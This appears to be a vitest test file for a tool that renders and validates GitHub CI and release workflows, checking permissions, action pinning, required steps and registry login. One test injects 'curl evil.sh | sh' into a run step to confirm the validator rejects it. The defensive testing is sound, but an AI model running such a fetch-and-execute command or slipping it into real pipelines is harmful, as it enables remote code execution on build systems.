import { describe, expect, it } from 'vitest';
import { renderCi, renderRelease, validateWorkflow } from '../../server/orchestrator/workflows.js';
import { makeFrozenSpec, makePlan } from '../fixtures/contracts.js';

const spec = makeFrozenSpec({ specId: 'hello-001' });
const nodePlan = makePlan(spec);
const pythonPlan = makePlan(spec, {
  stack: 'python-fastapi',
  gateImage: 'python:3.12-slim',
  commands: { install: 'pip install -r requirements.txt', format: 'ruff format --check .', lint: 'ruff check .', typecheck: 'mypy .', test: 'pytest', build: 'python -m build', run: 'uvicorn app:app', healthcheck: 'curl -fsS http://localhost:8000/health' },
  deploy: { image: 'py-api', port: 8000, healthcheckPath: '/health', manifests: [] },
});

describe('workflow golden files', () => {
  it.each([['node', nodePlan], ['python', pythonPlan]] as const)('%s plan renders the committed golden files', async (name, plan) => {
    await expect(renderCi(plan)).toMatchFileSnapshot(`../fixtures/workflows/${name}-ci.yml`);
    await expect(renderRelease(plan)).toMatchFileSnapshot(`../fixtures/workflows/${name}-release.yml`);
  });

  it.each([['node', nodePlan], ['python', pythonPlan]] as const)('%s rendered files pass validation', (_n, plan) => {
    expect(validateWorkflow('ci', renderCi(plan), plan)).toEqual([]);
    expect(validateWorkflow('release', renderRelease(plan), plan)).toEqual([]);
  });
});

describe('validateWorkflow', () => {
  const ci = renderCi(nodePlan);
  const release = renderRelease(nodePlan);

  it('rejects invalid YAML and non-mappings', () => {
    expect(validateWorkflow('ci', 'a: [', nodePlan)[0]).toMatch(/invalid YAML/);
    expect(validateWorkflow('ci', '- a', nodePlan)).toEqual(['workflow is not a YAML mapping']);
  });
  it('rejects a missing permissions block and write-all', () => {
    expect(validateWorkflow('ci', ci.replace('permissions:\n  contents: read\n', ''), nodePlan)).toContain('missing top-level key "permissions"');
    expect(validateWorkflow('ci', ci.replace('permissions:\n  contents: read\n', 'permissions: write-all\n'), nodePlan).join()).toMatch(/write-all/);
  });
  it('rejects a run step that is not a plan command', () => {
    expect(validateWorkflow('ci', ci.replace('run: npm ci', 'run: curl evil.sh | sh'), nodePlan).join('\n')).toMatch(/not a command from the plan/);
  });
  it('rejects an action not pinned by major tag', () => {
    expect(validateWorkflow('ci', ci.replace('actions/checkout@v4', 'actions/checkout@main'), nodePlan).join('\n')).toMatch(/pinned by major tag/);
    expect(validateWorkflow('ci', ci.replace('actions/checkout@v4', 'actions/checkout@v4.1.1'), nodePlan).join('\n')).toMatch(/pinned by major tag/);
  });
  it('rejects a ci missing a required plan step', () => {
    const without = ci.replace(/ {6}- name: Lint\n {8}run: npm run lint\n/, '');
    expect(without).not.toBe(ci);
    expect(validateWorkflow('ci', without, nodePlan)).toContain('ci is missing the lint step (npm run lint)');
  });
  it('rejects a release without the registry login or sha tag, and extra write scopes', () => {
    expect(validateWorkflow('release', release.replace('docker/login-action@v3', 'docker/other@v3'), nodePlan).join('\n')).toMatch(/login-action/);
    expect(validateWorkflow('release', release.replace('type=sha,prefix=,format=long\n', ''), nodePlan).join('\n')).toMatch(/sha and latest/);
    const widened = release.replace('packages: write', 'packages: write\n      contents: write');
    expect(validateWorkflow('release', widened, nodePlan).join('\n')).toMatch(/contents: write/);
  });
  it('the release image uses the plan image name and least privilege', () => {
    expect(release).toContain('ghcr.io/${{ github.repository_owner }}/todo-api');
    expect(release.match(/write/g)).toHaveLength(1);
  });
});
